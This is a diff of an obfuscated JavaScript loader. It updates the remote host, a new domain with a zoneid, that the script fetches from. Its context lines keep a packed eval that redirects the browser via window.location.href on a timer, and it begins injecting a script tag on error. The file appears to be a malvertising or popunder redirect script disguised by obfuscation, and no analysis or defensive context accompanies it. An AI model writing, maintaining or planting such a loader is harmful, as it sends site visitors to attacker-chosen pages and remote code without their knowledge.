@@ -1,8 +1,3 @@
-function file_get_contents(filename) {
-    fetch(filename).then((resp) => resp.text()).then((data) => {
-       return data;
-    });
-}
 try {
     K5aa.I5aa = I5aa;
     K5aa[575048] = window;
@@ -1822,9 +1817,7 @@ try {
                         return F3(N4[i1G.r4G(U4R)], P4);
                     }
                     i6 = O3[i1G.r4G(Z3R)];
-              
                     eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('8(7 0==\'6\'){5(()=>{4.3.2=0},1)}',9,9,'i6|100|href|location|window|setTimeout|string|typeof|if'.split('|')))
-
                     function w7() {
                         var S1;
                         S1 = +i1G.r4G(r1R);
@@ -3516,7 +3509,7 @@ try {
             l3 = v3 && v3[+r8G.U4G(N3R)];
             return l3 !== r8G.U4G(v2R);
         }
-    })('https://sportivki2v1cvetocher1fh.com/get/1793338?zoneid=1793338');
+    })('https://livezombymil.com/get/1807947?zoneid=1807947');
 } catch (e) {
     function handleException(e) {
         var tag = document.createElement('script');
